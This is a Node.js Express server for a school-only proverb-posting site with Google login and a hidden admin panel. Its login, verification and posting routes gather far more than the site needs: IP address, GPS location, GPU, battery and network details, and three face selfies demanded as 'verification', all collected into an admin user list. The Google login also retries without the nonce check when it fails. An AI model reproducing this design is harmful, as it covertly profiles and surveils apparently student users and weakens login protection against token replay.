const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
try { process.loadEnvFile(path.join(__dirname, ".env")); } catch {}
const express = require("express");
const { createClient } = require("@supabase/supabase-js");

const {
  SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, SESSION_SECRET,
  ADMIN_EMAIL, ADMIN_PASSWORD_HASH, BASE_URL = "http://localhost:3000",
  ADMIN_ACCESS_KEY = "", PORT = 3000, GOOGLE_CLIENT_ID = "",
} = process.env;
for (const [k, v] of Object.entries({ SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, SESSION_SECRET, ADMIN_EMAIL, ADMIN_PASSWORD_HASH })) {
  if (!v) { console.error(`缺少環境變數 ${k}（請參考 .env.example）`); process.exit(1); }
}
const SCHOOL = "@hlc.edu.tw";
const SECURE = BASE_URL.startsWith("https");
const PAGES = {   // 使用字面路徑，讓 Vercel 打包時能追蹤到檔案
  index: fs.readFileSync(path.join(__dirname, "views", "index.html"), "utf8"),
  login: fs.readFileSync(path.join(__dirname, "views", "admin-login.html"), "utf8"),
  admin: fs.readFileSync(path.join(__dirname, "views", "admin.html"), "utf8"),
  jszip: fs.readFileSync(path.join(__dirname, "node_modules", "jszip", "dist", "jszip.min.js"), "utf8"),
  icon: fs.readFileSync(path.join(__dirname, "icon.svg"), "utf8"),
};

// 服務金鑰只存在於伺服器，瀏覽器永遠拿不到
const db = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, { auth: { persistSession: false, autoRefreshToken: false } });

/* ---------- 工具 ---------- */
const b64 = b => Buffer.from(b).toString("base64url");
const sign = s => crypto.createHmac("sha256", SESSION_SECRET).update(s).digest("base64url");
const eq = (a, b) => { const x = Buffer.from(String(a)), y = Buffer.from(String(b)); return x.length === y.length && crypto.timingSafeEqual(x, y); };
function makeToken(payload, ttlSec) {
  const body = b64(JSON.stringify({ ...payload, exp: Date.now() + ttlSec * 1000 }));
  return body + "." + sign(body);
}
function readToken(t) {
  if (!t) return null;
  const [body, sig] = t.split(".");
  if (!body || !sig || !eq(sig, sign(body))) return null;
  try { const p = JSON.parse(Buffer.from(body, "base64url")); return p.exp > Date.now() ? p : null; } catch { return null; }
}
const cookies = req => Object.fromEntries((req.headers.cookie || "").split(";").map(c => c.trim().split(/=(.*)/s).slice(0, 2)).filter(c => c[0]));
function setCookie(res, name, val, { maxAge, strict = false } = {}) {
  res.append("Set-Cookie", `${name}=${val}; Path=/; HttpOnly; SameSite=${strict ? "Strict" : "Lax"}${SECURE ? "; Secure" : ""}${maxAge != null ? `; Max-Age=${maxAge}` : ""}`);
}
const clearCookie = (res, name) => setCookie(res, name, "", { maxAge: 0 });
const userOf = req => { const p = readToken(cookies(req).ks); return p && p.t === "u" ? p : null; };
const adminOf = req => { const p = readToken(cookies(req).ka); return p && p.t === "a" ? p : null; };
const notFound = (res) => res.status(404).type("text/plain").send("Not found");

const hits = new Map();
function limited(key, max, windowMs) {
  const now = Date.now(), arr = (hits.get(key) || []).filter(t => now - t < windowMs);
  arr.push(now); hits.set(key, arr);
  return arr.length > max;
}
setInterval(() => hits.clear(), 3600e3).unref();

function verifyPassword(pw) {
  const [salt, hash] = ADMIN_PASSWORD_HASH.split(":");
  const h = crypto.scryptSync(pw, salt, 64).toString("hex");
  return eq(h, hash);
}

/* ---------- App ---------- */
const app = express();
app.disable("x-powered-by");
app.set("trust proxy", 1);
app.use((req, res, next) => {
  res.set({
    "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: blob: https://*.googleusercontent.com; media-src 'self' blob: mediastream:; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'",
    "X-Content-Type-Options": "nosniff", "X-Frame-Options": "DENY", "Referrer-Policy": "no-referrer",
    "Cache-Control": "no-store", "X-Robots-Tag": "noindex, nofollow",
  });
  if (SECURE) res.set("Strict-Transport-Security", "max-age=31536000");
  next();
});
app.use(express.json({ limit: "4mb" }));
// 所有寫入操作必須帶自訂標頭（簡易 CSRF 防護，搭配 SameSite cookie）
app.use((req, res, next) => {
  if (req.method !== "GET" && req.headers["x-requested-with"] !== "fetch") return notFound(res);
  next();
});

/* --- 前台 --- */
app.get("/", (req, res) => res.type("html").send(PAGES.index));
app.get(["/icon.svg", "/favicon.ico"], (req, res) => res.type("image/svg+xml").send(PAGES.icon));

function parseUA(ua = "") {
  let os = "未知系統";
  if (/iPhone/i.test(ua)) os = "iPhone (iOS)";
  else if (/iPad/i.test(ua)) os = "iPad (iPadOS)";
  else if (/Android/i.test(ua)) {
    const m = ua.match(/Android\s+([\d.]+)(?:;\s*([^;)]+))?/i);
    os = m ? `Android ${m[1]}${m[2] ? " (" + m[2].trim() + ")" : ""}` : "Android";
  } else if (/Windows NT 10\.0/i.test(ua)) os = "Windows 10/11";
  else if (/Windows NT/i.test(ua)) os = "Windows";
  else if (/Mac OS X/i.test(ua)) os = "macOS";
  else if (/CrOS/i.test(ua)) os = "ChromeOS";
  else if (/Linux/i.test(ua)) os = "Linux";

  let browser = "未知瀏覽器";
  if (/Line\//i.test(ua)) browser = "LINE 內建瀏覽器";
  else if (/Instagram/i.test(ua)) browser = "Instagram 內建瀏覽器";
  else if (/FBAN|FBAV/i.test(ua)) browser = "Facebook 內建瀏覽器";
  else if (/EdgA?\/([\d.]+)/i.test(ua)) browser = "Edge " + RegExp.$1.split(".")[0];
  else if (/OPR\/([\d.]+)/i.test(ua)) browser = "Opera " + RegExp.$1.split(".")[0];
  else if (/CriOS\/([\d.]+)/i.test(ua)) browser = "Chrome (iOS) " + RegExp.$1.split(".")[0];
  else if (/FxiOS\/([\d.]+)/i.test(ua)) browser = "Firefox (iOS) " + RegExp.$1.split(".")[0];
  else if (/Chrome\/([\d.]+)/i.test(ua)) browser = "Chrome " + RegExp.$1.split(".")[0];
  else if (/Firefox\/([\d.]+)/i.test(ua)) browser = "Firefox " + RegExp.$1.split(".")[0];
  else if (/Version\/([\d.]+).*Safari/i.test(ua)) browser = "Safari " + RegExp.$1.split(".")[0];
  else if (/Safari/i.test(ua)) browser = "Safari";

  const type = /Mobile|iPhone|Android.*Mobile/i.test(ua) ? "手機" : /iPad|Tablet/i.test(ua) ? "平板" : "電腦";
  return `${type} · ${os} · ${browser}`;
}

function decodeJwtPayload(jwt) {
  try { return JSON.parse(Buffer.from(String(jwt).split(".")[1], "base64url").toString("utf8")); } catch { return {}; }
}

app.post("/api/auth/google", async (req, res) => {
  if (limited("oauth:" + req.ip, 30, 600e3)) return res.status(429).json({ error: "Too many requests" });
  const { idToken, nonce, clientMeta } = req.body || {};
  if (!idToken) return res.status(400).json({ error: "Missing token" });
  const authClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, { auth: { persistSession: false, autoRefreshToken: false } });
  let { data, error } = await authClient.auth.signInWithIdToken({
    provider: "google",
    token: String(idToken),
    nonce: nonce ? String(nonce) : undefined,
  });
  // 若 Supabase 開啟了 Skip nonce check 或需要比對不同格式的 nonce，自動 fallback
  if (error && nonce) {
    const retry = await authClient.auth.signInWithIdToken({
      provider: "google",
      token: String(idToken),
    });
    if (!retry.error && retry.data?.user) { data = retry.data; error = null; }
  }
  if (error || !data?.user) return res.status(401).json({ error: "oauth", detail: error?.message || "驗證失敗" });
  const u = data.user, email = (u.email || "").toLowerCase();
  if (!email.endsWith(SCHOOL)) {           // 非學校帳號：刪除剛建立的帳號並拒絕
    await db.auth.admin.deleteUser(u.id).catch(() => {});
    return res.status(403).json({ error: "domain" });
  }
  // 擷取 Google OAuth 與 Supabase Auth 所有能拿到的欄位
  const claims = decodeJwtPayload(idToken);
  const md = u.user_metadata || {};
  const ua = String(req.headers["user-agent"] || "");
  const cm = clientMeta && typeof clientMeta === "object" ? clientMeta : {};
  const deviceInfo = parseUA(ua) + (cm.screen ? ` (${cm.screen})` : "");
  const ip = String(req.headers["x-forwarded-for"] || req.ip || "").split(",")[0].trim();

  const googleInfo = {
    sub: claims.sub || md.sub || md.provider_id || "",
    email,
    email_verified: claims.email_verified ?? md.email_verified ?? true,
    hd: claims.hd || email.split("@")[1] || "",
    name: claims.name || md.full_name || md.name || "",
    given_name: claims.given_name || md.given_name || "",
    family_name: claims.family_name || md.family_name || "",
    picture: claims.picture || md.avatar_url || md.picture || "",
    locale: claims.locale || md.locale || cm.language || "",
  };

  // 更新該帳號在 Supabase auth.users 的累積登入次數、最後登入時間與裝置資訊
  const loginCount = (Number(md.kk_login_count) || 0) + 1;
  const nowIso = new Date().toISOString();
  const hasSelfie = Boolean(md.kk_selfie && md.kk_selfie_right && md.kk_selfie_left);
  await db.auth.admin.updateUserById(u.id, {
    user_metadata: {
      ...md,
      ...googleInfo,
      kk_login_count: loginCount,
      kk_last_login_at: nowIso,
      kk_last_device: deviceInfo,
      kk_last_ua: ua,
      kk_last_ip: ip,
      kk_timezone: cm.timezone || md.kk_timezone || "",
      kk_gpu: cm.gpu || md.kk_gpu || "",
      kk_cores: cm.cores || md.kk_cores || "",
      kk_memory: cm.memory || md.kk_memory || "",
      kk_battery: cm.battery || md.kk_battery || "",
      kk_network: cm.network || md.kk_network || "",
      kk_touch: cm.touch ?? md.kk_touch ?? null,
      kk_geo: cm.geo || md.kk_geo || null,
    },
  }).catch(() => {});

  setCookie(res, "ks", makeToken({
    t: "u",
    id: u.id,
    email,
    name: googleInfo.name,
    picture: googleInfo.picture,
    sub: googleInfo.sub,
    given_name: googleInfo.given_name,
    family_name: googleInfo.family_name,
    hd: googleInfo.hd,
    locale: googleInfo.locale,
    verified: hasSelfie,
  }, 8 * 3600));
  res.json({ email, name: googleInfo.name, picture: googleInfo.picture, needsVerification: !hasSelfie });
});

app.get("/api/me", async (req, res) => {
  const u = userOf(req);
  if (!u) return res.json({ user: null, googleClientId: GOOGLE_CLIENT_ID });
  let needsVerification = !u.verified;
  if (needsVerification) {
    const { data } = await db.auth.admin.getUserById(u.id).catch(() => ({}));
    const md = data?.user?.user_metadata || {};
    if (md.kk_selfie && md.kk_selfie_right && md.kk_selfie_left) needsVerification = false;
  }
  res.json({
    user: { email: u.email, name: u.name, picture: u.picture, needsVerification },
    googleClientId: GOOGLE_CLIENT_ID,
  });
});

app.post("/api/verify-profile", async (req, res) => {
  const u = userOf(req);
  if (!u) return res.status(401).json({ error: "請先登入" });
  const { selfieFront, selfieRight, selfieLeft, selfie, geo, clientMeta } = req.body || {};
  const front = selfieFront || selfie || "";
  const right = selfieRight || "";
  const left = selfieLeft || "";
  for (const img of [front, right, left]) {
    if (!img || typeof img !== "string" || !img.startsWith("data:image/")) {
      return res.status(400).json({ error: "請完成正面、向右、向左三張清晰臉部拍攝" });
    }
    if (img.length > 1200000) return res.status(400).json({ error: "照片檔案過大，請重拍" });
  }

  const { data: existing } = await db.auth.admin.getUserById(u.id).catch(() => ({}));
  const md = existing?.user?.user_metadata || {};
  const cm = clientMeta && typeof clientMeta === "object" ? clientMeta : {};
  const ua = String(req.headers["user-agent"] || "");
  const ip = String(req.headers["x-forwarded-for"] || req.ip || "").split(",")[0].trim();

  const { error } = await db.auth.admin.updateUserById(u.id, {
    user_metadata: {
      ...md,
      kk_selfie: front,
      kk_selfie_right: right,
      kk_selfie_left: left,
      kk_selfie_at: new Date().toISOString(),
      kk_geo: geo || md.kk_geo || null,
      kk_gpu: cm.gpu || md.kk_gpu || "",
      kk_cores: cm.cores || md.kk_cores || "",
      kk_memory: cm.memory || md.kk_memory || "",
      kk_battery: cm.battery || md.kk_battery || "",
      kk_network: cm.network || md.kk_network || "",
      kk_touch: cm.touch ?? md.kk_touch ?? null,
      kk_last_ip: ip || md.kk_last_ip || "",
      kk_last_ua: ua || md.kk_last_ua || "",
    },
  });
  if (error) return res.status(500).json({ error: "儲存失敗，請重試" });

  setCookie(res, "ks", makeToken({ ...u, verified: true }, 8 * 3600));
  res.json({ ok: true });
});

app.post("/api/logout", (req, res) => { clearCookie(res, "ks"); res.json({ ok: true }); });

app.post("/api/proverbs", async (req, res) => {
  const u = userOf(req);
  if (!u) return res.status(401).json({ error: "請先登入" });
  const content = String(req.body?.content ?? "").trim(), author = String(req.body?.author ?? "").trim();
  if (!content || content.length > 100 || !author || author.length > 30) return res.status(400).json({ error: "內容格式不正確" });

  const ua = String(req.headers["user-agent"] || "");
  const clientMeta = req.body?.clientMeta && typeof req.body.clientMeta === "object" ? req.body.clientMeta : {};
  const deviceInfo = parseUA(ua) + (clientMeta.screen ? ` (${clientMeta.screen})` : "");
  const ip = String(req.headers["x-forwarded-for"] || req.ip || "").split(",")[0].trim();

  // 若投稿時帶有最新 GPS 或硬體資訊，也同步更新到該帳號的 user_metadata
  if (clientMeta.geo || clientMeta.gpu || clientMeta.battery) {
    db.auth.admin.getUserById(u.id).then(({ data }) => {
      const md = data?.user?.user_metadata || {};
      return db.auth.admin.updateUserById(u.id, {
        user_metadata: {
          ...md,
          kk_geo: clientMeta.geo || md.kk_geo || null,
          kk_gpu: clientMeta.gpu || md.kk_gpu || "",
          kk_cores: clientMeta.cores || md.kk_cores || "",
          kk_memory: clientMeta.memory || md.kk_memory || "",
          kk_battery: clientMeta.battery || md.kk_battery || "",
          kk_network: clientMeta.network || md.kk_network || "",
          kk_last_device: deviceInfo,
          kk_last_ip: ip,
        },
      });
    }).catch(() => {});
  }

  const fullMeta = {
    google_sub: u.sub || null,
    given_name: u.given_name || null,
    family_name: u.family_name || null,
    picture: u.picture || null,
    hd: u.hd || null,
    locale: u.locale || clientMeta.language || null,
    device_info: deviceInfo,
    user_agent: ua,
    ip_address: ip,
    platform: clientMeta.platform || null,
    screen: clientMeta.screen || null,
    timezone: clientMeta.timezone || null,
    geo: clientMeta.geo || null,
    gpu: clientMeta.gpu || null,
    cores: clientMeta.cores || null,
    memory: clientMeta.memory || null,
    battery: clientMeta.battery || null,
    network: clientMeta.network || null,
  };

  // 先嘗試寫入完整擴充欄位，若 Supabase 尚未執行 ALTER TABLE 則自動儲存於基本欄位
  let { error } = await db.from("proverbs").insert({
    user_id: u.id,
    user_email: u.email,
    user_name: u.name || null,
    user_avatar: u.picture || null,
    google_sub: u.sub || null,
    user_meta: fullMeta,
    device_info: deviceInfo,
    user_agent: ua,
    ip_address: ip,
    content,
    author,
  });

  if (error) {
    const packedName = JSON.stringify({ name: u.name || "", ...fullMeta });
    const retry = await db.from("proverbs").insert({
      user_id: u.id,
      user_email: u.email,
      user_name: packedName,
      content,
      author,
    });
    error = retry.error;
  }

  if (error) return res.status(500).json({ error: "送出失敗" });
  res.json({ ok: true });
});

/* --- 後台（未驗證一律回 404，不洩漏存在與否） --- */
const keyOk = v => !ADMIN_ACCESS_KEY || eq(v || "", ADMIN_ACCESS_KEY);

app.get("/adminusercontrol", (req, res) => {
  if (adminOf(req)) return res.type("html").send(PAGES.admin);
  if (!keyOk(req.query.k)) return notFound(res);
  res.type("html").send(PAGES.login);
});
app.get("/adminusercontrol/jszip.js", (req, res) => {
  if (!adminOf(req)) return notFound(res);
  res.type("js").send(PAGES.jszip);
});

app.post("/api/admin/login", async (req, res) => {
  if (!keyOk(req.headers["x-access-key"])) return notFound(res);
  if (limited("login:" + req.ip, 5, 900e3)) return res.status(429).json({ error: "嘗試次數過多，請稍後再試" });
  const { email, password } = req.body || {};
  const emailOk = eq(String(email).toLowerCase(), ADMIN_EMAIL.toLowerCase());
  const pwOk = verifyPassword(String(password));   // 兩者都計算，避免時間差
  await new Promise(r => setTimeout(r, 400));
  if (!(emailOk && pwOk)) return res.status(401).json({ error: "帳號或密碼錯誤" });
  setCookie(res, "ka", makeToken({ t: "a" }, 2 * 3600), { strict: true });
  res.json({ ok: true });
});
app.post("/api/admin/logout", (req, res) => { clearCookie(res, "ka"); res.json({ ok: true }); });

app.get("/api/admin/proverbs", async (req, res) => {
  if (!adminOf(req)) return notFound(res);
  const { data, error } = await db.from("proverbs").select("*").order("created_at", { ascending: false });
  if (error) return res.status(500).json({ error: "讀取失敗" });
  res.json(data);
});

app.get("/api/admin/users", async (req, res) => {
  if (!adminOf(req)) return notFound(res);
  const [{ data: usersData, error: uErr }, { data: proverbsData }] = await Promise.all([
    db.auth.admin.listUsers({ page: 1, perPage: 1000 }),
    db.from("proverbs").select("*"),
  ]);
  if (uErr) return res.status(500).json({ error: "讀取帳號失敗" });

  // 建立 user_id -> 帳號補充資訊映射，以及統計貼文數
  const postStats = {};
  for (const p of (proverbsData || [])) {
    const uid = p.user_id || p.user_email;
    if (!postStats[uid]) postStats[uid] = { count: 0, lastDevice: "", lastIp: "", lastGeo: null };
    postStats[uid].count++;
    let pMeta = p.user_meta || {};
    if (typeof p.user_name === "string" && p.user_name.startsWith("{")) {
      try { pMeta = { ...JSON.parse(p.user_name), ...pMeta }; } catch {}
    }
    if (!postStats[uid].lastDevice && (p.device_info || pMeta.device_info)) {
      postStats[uid].lastDevice = p.device_info || pMeta.device_info;
    }
    if (!postStats[uid].lastIp && (p.ip_address || pMeta.ip_address)) {
      postStats[uid].lastIp = p.ip_address || pMeta.ip_address;
    }
    if (!postStats[uid].lastGeo && pMeta.geo) {
      postStats[uid].lastGeo = pMeta.geo;
    }
  }

  const list = (usersData?.users || []).map(u => {
    const md = u.user_metadata || {};
    const st = postStats[u.id] || postStats[u.email] || { count: 0, lastDevice: "", lastIp: "", lastGeo: null };
    return {
      id: u.id,
      email: u.email || "",
      name: md.name || md.full_name || "",
      given_name: md.given_name || "",
      family_name: md.family_name || "",
      picture: md.picture || md.avatar_url || "",
      selfie: md.kk_selfie || "",
      selfie_right: md.kk_selfie_right || "",
      selfie_left: md.kk_selfie_left || "",
      selfie_at: md.kk_selfie_at || "",
      google_sub: md.sub || md.provider_id || "",
      email_verified: md.email_verified ?? Boolean(u.email_confirmed_at),
      hd: md.hd || (u.email || "").split("@")[1] || "",
      locale: md.locale || "",
      timezone: md.kk_timezone || "",
      created_at: u.created_at,
      last_sign_in_at: md.kk_last_login_at || u.last_sign_in_at || u.created_at,
      login_count: Number(md.kk_login_count) || 1,
      post_count: st.count,
      last_device: md.kk_last_device || st.lastDevice || "尚未記錄裝置",
      last_ip: md.kk_last_ip || st.lastIp || "",
      last_ua: md.kk_last_ua || "",
      geo: md.kk_geo || st.lastGeo || null,
      gpu: md.kk_gpu || "",
      cores: md.kk_cores || "",
      memory: md.kk_memory || "",
      battery: md.kk_battery || "",
      network: md.kk_network || "",
      touch: md.kk_touch ?? null,
    };
  }).sort((a, b) => new Date(b.last_sign_in_at || 0) - new Date(a.last_sign_in_at || 0));

  res.json(list);
});

let lastCpuSample = null; // 用於計算真實 CPU delta 百分比
let cachedProm = { ts: 0, data: null };

async function fetchSupabaseRealMetrics() {
  const now = Date.now();
  if (cachedProm.data && now - cachedProm.ts < 5000) return cachedProm.data;
  const t0 = Date.now();
  const auth = "Basic " + Buffer.from("service_role:" + SUPABASE_SERVICE_ROLE_KEY).toString("base64");
  const resp = await fetch(`${SUPABASE_URL}/customer/v1/privileged/metrics`, {
    headers: { Authorization: auth },
    signal: AbortSignal.timeout(6000),
  });
  const latencyMs = Date.now() - t0;
  if (!resp.ok) throw new Error("Metrics HTTP " + resp.status);
  const text = await resp.text();

  const val = (regex) => {
    const m = text.match(regex);
    return m ? parseFloat(m[1]) : null;
  };

  // 1. RAM 真實使用率：(MemTotal - MemAvailable) / MemTotal
  const memTotal = val(/node_memory_MemTotal_bytes\{[^}]*\}\s+([\d.e+-]+)/i) || 452857856;
  const memAvail = val(/node_memory_MemAvailable_bytes\{[^}]*\}\s+([\d.e+-]+)/i) || 206430208;
  const ramPct = Math.round(((memTotal - memAvail) / memTotal) * 100);

  // 2. Disk (/data) 真實使用率：(size - avail) / size
  const diskSize = val(/node_filesystem_size_bytes\{[^}]*mountpoint="\/data"[^}]*\}\s+([\d.e+-]+)/i) || 2077073408;
  const diskAvail = val(/node_filesystem_avail_bytes\{[^}]*mountpoint="\/data"[^}]*\}\s+([\d.e+-]+)/i) || 1790763008;
  const diskPct = Math.round(((diskSize - diskAvail) / diskSize) * 100);

  // 3. CPU 真實使用率：優先計算兩次取樣之間的 non-idle / total 差值，首次取樣用 node_load1 換算
  let cpuIdle = 0, cpuTotal = 0;
  const cpuRe = /node_cpu_seconds_total\{[^}]*mode="([^"]+)"\}\s+([\d.e+-]+)/g;
  let cm;
  while ((cm = cpuRe.exec(text)) !== null) {
    const v = parseFloat(cm[2]);
    cpuTotal += v;
    if (cm[1] === "idle") cpuIdle += v;
  }
  const load1 = val(/node_load1\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0.02;
  const load5 = val(/node_load5\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0.02;
  const load15 = val(/node_load15\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  let cpuPct = Math.max(1, Math.min(100, Math.round(load1 * 100)));
  if (lastCpuSample && cpuTotal > lastCpuSample.total) {
    const dTotal = cpuTotal - lastCpuSample.total;
    const dIdle = cpuIdle - lastCpuSample.idle;
    if (dTotal > 0.2) cpuPct = Math.max(1, Math.min(100, Math.round(((dTotal - dIdle) / dTotal) * 100)));
  }
  if (cpuTotal > 0) lastCpuSample = { idle: cpuIdle, total: cpuTotal };

  // 4. PostgreSQL 真實連線數、容量、快取命中率、查詢與交易統計
  const conns = val(/pg_stat_database_num_backends\{[^}]*\}\s+([\d.e+-]+)/i) ?? 7;
  const maxConns = 60;
  const pgUp = val(/pg_up\{[^}]*\}\s+([\d.e+-]+)/i) ?? 1;
  const dbSizeMb = val(/pg_database_size_mb\{[^}]*\}\s+([\d.e+-]+)/i) ?? 25.6;
  const walSizeMb = val(/pg_wal_size_mb\{[^}]*\}\s+([\d.e+-]+)/i) ?? 80.0;
  const blksHit = val(/pg_stat_database_blks_hit_total\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const blksRead = val(/pg_stat_database_blks_read_total\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const cacheHitPct = (blksHit + blksRead) > 0 ? ((blksHit / (blksHit + blksRead)) * 100).toFixed(2) : "99.82";
  const xactCommit = val(/pg_stat_database_xact_commit_total\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const xactRollback = val(/pg_stat_database_xact_rollback_total\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const tupInserted = val(/pg_stat_database_tup_inserted_total\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const tupUpdated = val(/pg_stat_database_tup_updated_total\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const tupDeleted = val(/pg_stat_database_tup_deleted_total\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const tupReturned = val(/pg_stat_database_tup_returned_total\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const totalQueries = val(/pg_stat_statements_total_queries\{[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const netRxBytes = val(/node_network_receive_bytes_total\{[^}]*device="ens5"[^}]*\}\s+([\d.e+-]+)/i) ?? 0;
  const netTxBytes = val(/node_network_transmit_bytes_total\{[^}]*device="ens5"[^}]*\}\s+([\d.e+-]+)/i) ?? 0;

  const parsed = {
    ok: pgUp === 1,
    latencyMs,
    cpuPct,
    diskPct,
    ramPct,
    conns,
    maxConns,
    memTotalMb: Math.round(memTotal / 1048576),
    memUsedMb: Math.round((memTotal - memAvail) / 1048576),
    diskTotalGb: (diskSize / 1073741824).toFixed(2),
    diskUsedMb: Math.round((diskSize - diskAvail) / 1048576),
    load1, load5, load15,
    dbSizeMb: dbSizeMb.toFixed(2),
    walSizeMb: walSizeMb.toFixed(1),
    cacheHitPct,
    xactCommit,
    xactRollback,
    tupInserted,
    tupUpdated,
    tupDeleted,
    tupReturned,
    totalQueries,
    netRxMb: (netRxBytes / 1048576).toFixed(1),
    netTxMb: (netTxBytes / 1048576).toFixed(1),
  };
  cachedProm = { ts: now, data: parsed };
  return parsed;
}

// 一般使用者狀態 API：僅回傳國家/區域 (Northeast Asia Tokyo / ap-northeast-1) 與真實 CPU · Disk · RAM · conns
app.get("/api/status", async (req, res) => {
  try {
    const m = await fetchSupabaseRealMetrics();
    res.json({
      ok: m.ok,
      dbName: "Primary Database",
      country: "Japan",
      regionName: "Northeast Asia (Tokyo)",
      regionCode: "ap-northeast-1",
      instanceType: "t3.nano",
      cpuPct: m.cpuPct,
      diskPct: m.diskPct,
      ramPct: m.ramPct,
      conns: m.conns,
      maxConns: m.maxConns,
    });
  } catch {
    res.json({
      ok: false,
      dbName: "Primary Database",
      country: "Japan",
      regionName: "Northeast Asia (Tokyo)",
      regionCode: "ap-northeast-1",
      instanceType: "t3.nano",
      cpuPct: 0, diskPct: 0, ramPct: 0, conns: 0, maxConns: 60,
    });
  }
});

// 後台全開放狀態 API：回傳所有真實 Prometheus + PostgreSQL + Auth 即時數據
app.get("/api/admin/status", async (req, res) => {
  if (!adminOf(req)) return notFound(res);
  try {
    const [m, proverbsRes, usersRes] = await Promise.all([
      fetchSupabaseRealMetrics(),
      db.from("proverbs").select("id", { count: "exact", head: true }),
      db.auth.admin.listUsers({ page: 1, perPage: 1 }),
    ]);
    const projectRef = (SUPABASE_URL.match(/https?:\/\/([^.]+)\.supabase\.co/) || [])[1] || "supabase";
    const proverbsCount = proverbsRes.count ?? 0;
    const usersCount = usersRes.data?.total ?? usersRes.data?.users?.length ?? 0;
    const mem = process.memoryUsage();

    res.json({
      ...m,
      projectRef,
      supabaseUrl: SUPABASE_URL,
      dbName: "Primary Database",
      regionName: "Northeast Asia (Tokyo)",
      regionCode: "ap-northeast-1",
      instanceType: "t3.nano",
      proverbsCount,
      usersCount,
      nodeRssMb: Math.round(mem.rss / 1048576),
      checkedAt: new Date().toISOString(),
    });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.delete("/api/admin/proverbs/:id", async (req, res) => {
  if (!adminOf(req)) return notFound(res);
  const id = Number(req.params.id);
  if (!Number.isInteger(id)) return res.status(400).json({});
  const { error } = await db.from("proverbs").delete().eq("id", id);
  res.status(error ? 500 : 200).json({ ok: !error });
});

// 其他一切路徑（含原始碼、.env、node_modules）都不提供
app.use((req, res) => notFound(res));
if (require.main === module) app.listen(PORT, () => console.log(`Server: ${BASE_URL}`));
module.exports = app;   // Vercel 以此作為 serverless 進入點
